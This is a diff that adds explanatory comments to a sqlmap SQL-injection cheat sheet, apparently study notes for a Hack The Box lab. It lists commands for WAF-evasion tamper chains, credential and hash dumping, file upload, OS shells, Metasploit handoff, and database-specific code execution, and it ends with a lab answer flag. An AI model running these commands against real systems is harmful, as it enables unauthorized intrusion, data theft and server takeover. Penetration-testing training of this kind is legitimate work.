@@ -23,6 +23,7 @@ sqlmap -r req.txt --batch
 # Mark injection point with *
 --data="id=1*&name=x"     # only test id
 ```
+> Six entry-point variants. `--batch` answers all prompts automatically. Use `-r req.txt` to pass a raw HTTP request saved from Burp — the easiest method for complex requests. Use `*` to pin the injection point when sqlmap should only test one parameter.
 
 ---
 
@@ -36,6 +37,7 @@ sqlmap -r req.txt --batch
 --no-cast                 # fix silent UNION failures
 --threads=10              # parallelize blind retrieval
 ```
+> Add these flags to any sqlmap command to speed it up. `--dbms=mysql` skips 75% of payloads that target other databases. `--technique=U` is fastest when UNION works. `--no-cast` fixes the most common reason UNION returns no data. `--threads=10` dramatically speeds up blind extraction.
 
 ---
 
@@ -55,6 +57,7 @@ sqlmap -r req.txt --batch
 --union-char='a'           # replace NULL filler
 --union-from=table         # required for Oracle
 ```
+> Use `--prefix`/`--suffix` when you know the query wraps input in extra characters (backticks, parentheses, LIKE wildcards). Increase `--level` to test more injection points; increase `--risk` to enable OR payloads that could modify data. Set `--union-cols` when sqlmap guesses the wrong column count.
 
 ---
 
@@ -76,6 +79,7 @@ sqlmap -r req.txt --batch
 --tamper=between,space2comment,randomcase
 sqlmap --list-tampers              # list all tampers
 ```
+> Chain multiple tamper scripts with commas. Start with `between,space2comment,randomcase` as the most common WAF combo. Use `--list-tampers` to see all available scripts with descriptions. Add `--flush-session` when switching tampers so sqlmap re-tests rather than using cached results.
 
 ---
 
@@ -105,6 +109,7 @@ sqlmap -u "TARGET" --dump-all --exclude-sysdbs
 # DB user hashes (auto-crack offered)
 sqlmap -u "TARGET" --passwords --batch
 ```
+> Standard enumeration sequence. Run `--banner --current-user --current-db --is-dba` first to establish what you're working with. Use `--search` to find credential-related tables and columns quickly. `--dump --where=` filters rows so you only retrieve what you need. `--passwords` dumps and optionally cracks MySQL user hashes.
 
 ---
 
@@ -131,6 +136,7 @@ sqlmap -u "TARGET" --os-cmd="id" --technique=E
 # Full exploit (with Metasploit)
 sqlmap -u "TARGET" --os-pwn
 ```
+> OS exploitation requires DBA privileges — confirm with `--is-dba` first. `--file-write` uploads a local file; `--file-dest` sets its path on the server. `--os-shell` opens an interactive command shell; `--technique=E` uses error-based injection which is more reliable than time-based for interactive sessions. `--os-pwn` hands off to Metasploit for a full Meterpreter session.
 
 ---
 
@@ -143,6 +149,7 @@ sqlmap -u "TARGET" --os-pwn
 -v 6                       # full request+response stream
 --proxy="http://127.0.0.1:8080"   # route through Burp
 ```
+> Debugging flags to diagnose why sqlmap isn't finding injection. Start with `--parse-errors` to see database error messages. Use `-v 3` to see each tested payload. Route through Burp with `--proxy` to visually inspect what sqlmap is sending.
 
 ---
 
@@ -214,6 +221,7 @@ sqlmap -u "TARGET" --os-pwn
 # Cloudflare default rules:
 --tamper=between,charunicodeencode,space2comment,randomcase
 ```
+> Pre-built tamper chains for common WAF configurations. Start with the first combo for unknown WAFs. Use the Cloudflare chain against any CDN-protected target. Always add `--flush-session` when you change tampers so sqlmap re-runs tests from scratch.
 
 ---
 
@@ -226,6 +234,7 @@ sqlmap -u "TARGET" --os-pwn
 --tamper=between,space2comment      # most common WAF combo
 --technique=E                       # error-based EXTRACTVALUE/UPDATEXML
 ```
+> MySQL-specific flags. Use the backtick prefix when column names are wrapped in backticks. Error-based technique (`-E`) works well on MySQL and returns data without needing a UNION.
 
 ### MSSQL
 ```bash
@@ -233,24 +242,28 @@ sqlmap -u "TARGET" --os-pwn
 --tamper=plus2concat,space2mssqlblank
 --os-shell                          # xp_cmdshell — sqlmap enables it automatically if sysadmin
 ```
+> MSSQL supports stacked queries, so `--technique=ES` (error + stacked) is standard. `--os-shell` automatically enables `xp_cmdshell` if the user has sysadmin rights.
 
 ### PostgreSQL
 ```bash
 --dbms=postgresql --technique=ES
 --os-shell                          # COPY FROM PROGRAM — needs superuser
 ```
+> PostgreSQL RCE via `COPY FROM PROGRAM` — requires superuser. Stacked queries are supported so `ES` is the right technique combo.
 
 ### Oracle
 ```bash
 --dbms=oracle --technique=BT        # blind boolean + time (no stacked, no UNION FROM-less)
 --union-from=DUAL                   # required FROM clause
 ```
+> Oracle requires `FROM DUAL` in every SELECT — without `--union-from=DUAL`, UNION injection fails. Oracle doesn't support stacked queries, so use boolean blind and time-based.
 
 ### NoSQL (limited)
 sqlmap doesn't natively handle MongoDB — use `nosqlmap` instead:
 ```bash
 git clone https://github.com/codingo/NoSQLMap.git && cd NoSQLMap && python3 nosqlmap.py
 ```
+> Installs and launches NoSQLMap for MongoDB injection attacks. sqlmap cannot handle NoSQL — use this tool instead when the target uses MongoDB.
 
 ---
 
@@ -261,6 +274,7 @@ sqlmap -u "http://TARGET/register" --data="user=test*&pass=x" \
        --second-url="http://TARGET/profile/test"
 # The * marks the injection point in the FIRST URL; --second-url is where the stored value is retrieved
 ```
+> Second-order (stored) SQLi. The injection payload is sent to the first URL; the result is retrieved from the second URL. Use `*` in the first request body to mark which parameter gets the payload. Replace the URLs and parameters with your target's values.
 
 ---
 
@@ -278,6 +292,7 @@ sqlmap -r request.txt --batch                       # mark * in the saved reques
 # Force a specific testable param (when sqlmap auto-test misses):
 sqlmap -u "http://TARGET/?id=1&other=2" -p id
 ```
+> Targets injection points that sqlmap's auto-detection misses. Place `*` directly in the value you want tested. `-p param` forces testing of a specific named parameter. Use `-H` for custom headers and `--level=5` to test headers (sqlmap ignores them at lower levels). Replace URLs and parameter names with your target's values.
 
 ---
 
@@ -311,6 +326,7 @@ sqlmap -u "http://TARGET/action.php" --data='{"id":1}' \
   --tamper=between --random-agent --batch --flush-session \
   --dump -T final_flag -D production
 ```
+> Skills assessment command. JSON body with the `between` tamper and a random user agent to bypass filtering. `--flush-session` clears any cached failed detection. `-T final_flag -D production` targets the specific table directly. Replace `TARGET`, the endpoint, and table/DB names with your target's values.
 
 **Flag:** `HTB{n07_50_h4rd_r16h7?!}`
 
